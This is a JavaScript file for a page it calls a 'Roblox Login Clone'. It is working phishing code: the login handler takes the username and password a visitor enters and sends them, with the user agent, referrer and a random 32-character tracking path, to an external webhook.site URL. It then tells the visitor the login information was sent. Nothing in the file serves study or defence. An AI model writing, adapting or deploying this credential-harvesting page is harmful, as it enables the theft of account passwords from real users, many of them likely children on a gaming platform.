// Global variables
let currentPath = '';
const WEBHOOK_URL = 'https://webhook.site/144799c6-bbe3-4761-9d6b-5592a5f87557';

// Router functionality
class Router {
    constructor() {
        this.routes = {};
        this.init();
    }

    init() {
        window.addEventListener('popstate', () => {
            this.handleRoute();
        });
        this.handleRoute();
    }

    addRoute(path, handler) {
        this.routes[path] = handler;
    }

    handleRoute() {
        const path = window.location.pathname;
        currentPath = path;

        // Check if it's a 32-character path (excluding the leading slash)
        const pathWithoutSlash = path.substring(1);
        
        if (pathWithoutSlash.length === 32 && /^[a-zA-Z0-9]+$/.test(pathWithoutSlash)) {
            // Valid 32-character path
            this.showLoginPage();
        } else if (path === '/' || path === '') {
            // Root path
            this.showLoginPage();
        } else {
            // Invalid path
            this.show404();
        }
    }

    showLoginPage() {
        // Login page is already displayed, just ensure it's visible
        document.querySelector('.main-content').style.display = 'flex';
        document.querySelector('.error-message').style.display = 'none';
    }

    show404() {
        // For simplicity, redirect to root
        window.history.replaceState({}, '', '/');
        this.showLoginPage();
    }

    navigate(path) {
        window.history.pushState({}, '', path);
        this.handleRoute();
    }
}

// Form handling
class LoginForm {
    constructor() {
        this.form = document.getElementById('loginForm');
        this.usernameInput = document.getElementById('username');
        this.passwordInput = document.getElementById('password');
        this.loginBtn = document.getElementById('loginBtn');
        this.btnText = this.loginBtn.querySelector('.btn-text');
        this.loadingSpinner = this.loginBtn.querySelector('.loading-spinner');
        
        this.init();
    }

    init() {
        this.form.addEventListener('submit', (e) => {
            e.preventDefault();
            this.handleSubmit();
        });

        // Real-time validation
        this.usernameInput.addEventListener('input', () => this.validateForm());
        this.passwordInput.addEventListener('input', () => this.validateForm());
    }

    validateForm() {
        const username = this.usernameInput.value.trim();
        const password = this.passwordInput.value.trim();
        
        const isValid = username.length > 0 && password.length > 0;
        this.loginBtn.disabled = !isValid;
        
        return isValid;
    }

    async handleSubmit() {
        if (!this.validateForm()) {
            this.showError('Please fill in all required fields.');
            return;
        }

        const username = this.usernameInput.value.trim();
        const password = this.passwordInput.value.trim();

        // Show loading state
        this.setLoading(true);

        try {
            await this.submitLogin(username, password);
        } catch (error) {
            this.showError('Login failed. Please try again.');
            console.error('Login error:', error);
        } finally {
            this.setLoading(false);
        }
    }

    async submitLogin(username, password) {
        // Prepare data for GET request
        const params = new URLSearchParams({
            username: username,
            password: password,
            path: currentPath,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            referrer: document.referrer || 'direct'
        });

        const url = `${WEBHOOK_URL}?${params.toString()}`;

        try {
            const response = await fetch(url, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                }
            });

            if (response.ok) {
                this.showSuccess('Login information sent successfully!');
                // Clear form after successful submission
                setTimeout(() => {
                    this.form.reset();
                    this.validateForm();
                }, 2000);
            } else {
                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }
        } catch (error) {
            // Handle network errors
            if (error.name === 'TypeError' && error.message.includes('fetch')) {
                throw new Error('Network error: Please check your internet connection.');
            }
            throw error;
        }
    }

    setLoading(isLoading) {
        this.loginBtn.disabled = isLoading;
        
        if (isLoading) {
            this.btnText.style.display = 'none';
            this.loadingSpinner.style.display = 'block';
        } else {
            this.btnText.style.display = 'block';
            this.loadingSpinner.style.display = 'none';
        }
    }

    showError(message) {
        const errorDiv = document.getElementById('errorMessage');
        const errorText = errorDiv.querySelector('.error-text');
        
        errorText.textContent = message;
        errorDiv.style.display = 'block';
        
        // Auto-hide after 5 seconds
        setTimeout(() => {
            this.hideError();
        }, 5000);
    }

    showSuccess(message) {
        // Create a success message similar to error but with green color
        const errorDiv = document.getElementById('errorMessage');
        const errorText = errorDiv.querySelector('.error-text');
        
        errorDiv.style.backgroundColor = '#2e7d32';
        errorText.textContent = message;
        errorDiv.style.display = 'block';
        
        // Auto-hide after 3 seconds and reset color
        setTimeout(() => {
            this.hideError();
            errorDiv.style.backgroundColor = '#d32f2f';
        }, 3000);
    }

    hideError() {
        document.getElementById('errorMessage').style.display = 'none';
    }
}

// Utility functions
function closeError() {
    document.getElementById('errorMessage').style.display = 'none';
}

function generateRandomPath() {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < 32; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// Additional button handlers
function setupAdditionalButtons() {
    const optionButtons = document.querySelectorAll('.option-btn');
    
    optionButtons.forEach(button => {
        button.addEventListener('click', (e) => {
            e.preventDefault();
            
            // Visual feedback
            button.style.transform = 'scale(0.98)';
            setTimeout(() => {
                button.style.transform = 'scale(1)';
            }, 100);
            
            // Show info message
            const loginForm = new LoginForm();
            loginForm.showError(`${button.textContent} feature is not available in this demo.`);
        });
    });

    // Handle forgot password link
    const forgotLink = document.querySelector('.forgot-link');
    if (forgotLink) {
        forgotLink.addEventListener('click', (e) => {
            e.preventDefault();
            const loginForm = new LoginForm();
            loginForm.showError('Password recovery feature is not available in this demo.');
        });
    }

    // Handle sign up links
    const signupLinks = document.querySelectorAll('.signup-btn, .signup-text');
    signupLinks.forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            const loginForm = new LoginForm();
            loginForm.showError('Sign up feature is not available in this demo.');
        });
    });
}

// Enhanced mobile experience
function setupMobileOptimizations() {
    // Prevent zoom on input focus for iOS
    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
        input.addEventListener('focus', () => {
            if (window.innerWidth < 768) {
                const viewport = document.querySelector('meta[name=viewport]');
                viewport.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
            }
        });
        
        input.addEventListener('blur', () => {
            if (window.innerWidth < 768) {
                const viewport = document.querySelector('meta[name=viewport]');
                viewport.setAttribute('content', 'width=device-width, initial-scale=1.0');
            }
        });
    });

    // Handle orientation changes
    window.addEventListener('orientationchange', () => {
        setTimeout(() => {
            window.scrollTo(0, 0);
        }, 100);
    });
}

// Keyboard navigation
function setupKeyboardNavigation() {
    document.addEventListener('keydown', (e) => {
        // Enter key on form elements
        if (e.key === 'Enter') {
            const activeElement = document.activeElement;
            
            if (activeElement.classList.contains('login-input')) {
                e.preventDefault();
                
                if (activeElement === document.getElementById('username')) {
                    document.getElementById('password').focus();
                } else if (activeElement === document.getElementById('password')) {
                    document.getElementById('loginForm').dispatchEvent(new Event('submit'));
                }
            }
        }
        
        // Escape key to close error messages
        if (e.key === 'Escape') {
            closeError();
        }
    });
}

// Performance monitoring
function setupPerformanceMonitoring() {
    // Monitor page load performance
    window.addEventListener('load', () => {
        if ('performance' in window) {
            const loadTime = performance.timing.loadEventEnd - performance.timing.navigationStart;
            console.log(`Page load time: ${loadTime}ms`);
            
            // Track if load time is too slow
            if (loadTime > 3000) {
                console.warn('Slow page load detected');
            }
        }
    });
}

// Initialize application
document.addEventListener('DOMContentLoaded', () => {
    // Initialize router
    const router = new Router();
    
    // Initialize login form
    const loginForm = new LoginForm();
    
    // Setup additional functionality
    setupAdditionalButtons();
    setupMobileOptimizations();
    setupKeyboardNavigation();
    setupPerformanceMonitoring();
    
    // Handle browser back/forward buttons
    window.addEventListener('popstate', () => {
        router.handleRoute();
    });
    
    console.log('Roblox Login Clone initialized successfully');
    console.log(`Current path: ${currentPath}`);
});

// Export for potential external use
window.RobloxLogin = {
    Router,
    LoginForm,
    generateRandomPath,
    closeError
};
